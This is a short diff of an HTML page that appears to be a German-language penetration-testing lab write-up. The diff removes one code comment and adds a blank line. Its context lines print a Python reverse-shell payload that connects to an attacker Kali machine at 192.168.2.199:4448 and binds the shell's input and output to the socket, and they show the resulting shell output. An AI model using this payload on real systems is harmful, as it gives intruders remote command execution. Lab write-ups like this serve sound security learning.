@@ -802,7 +802,7 @@ ftp&gt; ls -la
 <pre>
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("192.168.2.199", 4448)) # Deine Kali-IP und ein NEUER Port
+s.connect(("192.168.2.199", 4448)) 
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
@@ -878,4 +878,5 @@ bash: no job control in this shell
     </footer>
 
 </body>
+
 </html>
